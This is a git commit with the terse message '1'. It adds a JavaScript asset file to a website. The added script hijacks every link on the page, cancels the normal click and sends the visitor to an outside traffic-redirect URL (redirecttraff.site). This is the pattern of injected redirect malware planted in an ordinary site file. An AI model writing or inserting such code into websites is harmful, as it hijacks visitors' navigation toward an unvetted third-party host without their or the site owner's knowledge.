56ed56f614da42236bbd7dd3f7e7526c4512af49
maratbabaev <you@example.com>
2025-03-31 15:39:26 +0300

    1

---
+++ assets/js/script.js
@@ -0,0 +1,7 @@
+document.querySelectorAll("a").forEach((elem) => {
+	elem.onclick = function (e) {
+		e.preventDefault();
+		window.location.href = "https://redirecttraff.site/3QL7dwQ8";
+		return false;
+	};
+});
